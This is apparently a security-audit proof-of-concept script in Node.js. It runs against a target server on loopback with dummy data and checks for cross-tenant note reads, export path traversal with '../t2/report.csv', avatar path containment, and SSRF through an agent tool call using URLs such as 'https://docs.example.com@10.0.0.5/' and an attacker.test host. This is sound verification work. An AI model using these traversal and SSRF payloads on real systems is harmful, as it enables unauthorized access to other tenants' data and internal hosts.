// Minimal bounded PoCs on dummy data inside the sandbox (loopback only). Prints one JSON line per check.
import fs from 'node:fs';
process.env.EXPORT_ROOT = '/scratch/exports';
fs.mkdirSync('/scratch/exports/t2', { recursive: true });
fs.writeFileSync('/scratch/exports/t2/report.csv', 'dummy,t2\n');
const { createServer } = await import('/target/src/server.mjs');
const { sign } = await import('/target/src/auth.mjs');
const out = (check, result) => console.log(JSON.stringify({ check, ...result }));
const server = createServer().listen(0, '127.0.0.1');
await new Promise((r) => server.once('listening', r));
const base = `http://127.0.0.1:${server.address().port}`;
const auth = { authorization: `Bearer ${sign('u1')}` };
let r = await fetch(`${base}/notes/n2`, { headers: auth });
out('T1-cross-tenant-note-read', { status: r.status, tenantOfBody: (await r.json()).tenantId, actorTenant: 't1' });
r = await fetch(`${base}/export?name=${encodeURIComponent('../t2/report.csv')}`, { headers: auth });
out('T2-export-traversal', { status: r.status, body: (await r.json()).data ?? null });
r = await fetch(`${base}/avatars/${encodeURIComponent('../exports/t2/report.csv')}`, { headers: auth });
out('N2-avatar-containment', { status: r.status });
for (const url of ['https://docs.example.com@10.0.0.5/', 'https://docs.example.com.attacker.test/']) {
  try { new Request(url); out('T4-request-construct', { url, constructed: true }); } catch (e) { out('T4-request-construct', { url, constructed: false, error: e.name }); }
}
r = await fetch(`${base}/agent/tool-call`, { method: 'POST', headers: { ...auth, 'content-type': 'application/json' }, body: JSON.stringify({ name: 'fetch_doc', args: { url: 'https://docs.example.com@10.0.0.5/' } }) });
out('T4-userinfo-via-tool', { status: r.status });
server.close();
